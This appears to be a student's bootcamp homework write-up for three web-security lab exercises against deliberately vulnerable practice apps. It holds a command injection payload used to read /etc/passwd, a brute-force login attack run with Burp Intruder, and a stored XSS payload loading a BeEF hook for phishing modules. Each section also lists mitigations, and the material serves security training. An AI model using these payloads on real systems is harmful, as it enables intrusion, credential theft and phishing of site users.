# Web Application 1: Your Wish is My Command Injection

1. Complete the following to set up the activity.

   - Access Vagrant and open a browser.
   - Navigate to the following webpage: http://192.168.13.25 and select the Command Injection option.
   - Alternatively, access the webpage directly at this page: http://192.168.13.25/vulnerabilities/exec/
	 - The web page should look like the following: [Setup](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/Setup.PNG)

2. This page is a new web application built by Replicants in order to enable their customers to ping an IP address. The web page will return the results of the ping command back to the user.
Complete the following steps to walkthrough the intended purpose of the web application.
	 - Test the webpage by entering the IP address 8.8.8.8. Press Submit to see the results display on the web application.
   - [8.8.8.8](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/HW%201.PNG)

3. Test if we can manipulate the input to cause an unintended result.

    -  On the same webpage, enter the following command (payload) in the field: 8.8.8.8 && pwd
    -  Press Enter. Note the ping results are the results of the second pwd command:
    - [8.8.8.8 && pwd](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/8.8.8.8%20%26%26%20pwd.PNG)

4. Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:
    - [etc/passwd](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/HW%203.PNG)
    - [etc/hosts](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/etc_hosts.PNG)
6. Deliverables:
    - Setup
        ![Setup](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/Setup.PNG)
    - 8.8.8.8
        ![8.8.8.8](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/HW%201.PNG)
    - 8.8.8.8 && pwd
        ![8.8.8.8 && pwd](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/8.8.8.8%20%26%26%20pwd.PNG)
    - /etc/passwd
        ![/etc/passwd](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/HW%203.PNG)
    - /etc/hosts
        ![/etc/hosts](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/etc_hosts.PNG)

 - Possible mitigation strategies:
   - 	Have input validation against untrusted inputs so that any input to the application that has not been previously validated must be examined first. 
   - 	Apply the principle of least privilege. Ensure that each web server can only access directories or files it should be able to access, as a second line of defense. 

# Web Application 2: A Brute Force to Be Reckoned With 

1. Complete the following steps to set up the activity.
   -  Open a browser on Vagrant and navigate to the webpage http://192.168.13.35/install.php.
2.  This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login. 
    - If the user/password combination is correct, it will return a successful message.
    - If the user/password combination is incorrect, it will return the message, "Invalid credentials."

3. Years ago, Replicants had a systems breach and several administrators passwords were stolen by a malicious hacker. The malicious hacker was only able to capture a list of passwords, not the associated accounts' usernames. Your manager is concerned that one of the administrators that accesses this new web application is using one of these compromised passwords. Therefore, there is a risk that the malicious hacker can use these passwords to access an administrator's account and view confidential data.
    - Use the web application tool Burp Suite, specifically the Burp Suite Intruder feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application.
    - You've been provided with a list of administrators and the breached passwords:
      - List of Administrators
      - Breached list of Passwords
4. Deliverables:
    - Setup
        ![Setup](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/bWapp%201.PNG)
    - Broken Authentication
        
        ![Broken Authentication](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/bWapp%202.png)
    
    - BurpSuite 1
        
        ![BurpSuite 1](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/burp%201.png)
    - BurpSuite 2
        
        ![BurpSuite 2](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/burp%202.png)
    - BurpSuite 3
        
        ![BurpSuite 3](https://github.com/jbutterfield15/BootCampHW/blob/main/Unit%2015%20Homework/Images/burp%203.png)
        
 - Possible mitigation strategies:
   - 	Set up Multi-factor Authentication
   -	Account Lockout after set number of invalid login attempts

# Web Application 3: Where’s the BeEF?

 - Task details:
   - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: http://192.168.13.25/vulnerabilities/xss_s/
   - The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js
   - The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>

- When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.
	 
- Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:
   - Social Engineering >> Pretty Theft
   - Social Engineering >> Fake Notification Bar
   - Host >> Get Geolocation (Third Party)

- Deliverables:
   - Fake Notification Bar
        
        ![Fake Notification Bar](https://user-images.githubusercontent.com/93692721/167760596-e8d506ae-d396-4dd8-98a0-14fb1bc37b6f.png)
   - Facebook Login
        
        ![Social Engineering - FB Login](https://user-images.githubusercontent.com/93692721/167760461-40007697-54d0-482d-8fd4-0b9dc8bec353.png)
   - Geolocation
        
        ![Get Geolocation](https://user-images.githubusercontent.com/93692721/167760737-c249bcf1-9d52-4b9d-a078-8185a0285ab5.png)
  
Possible mitigation strategies:

   -	Sanitize user input and use validation to catch potentially malicious input 
   -	Limit use of user-provided data to only what’s necessary 
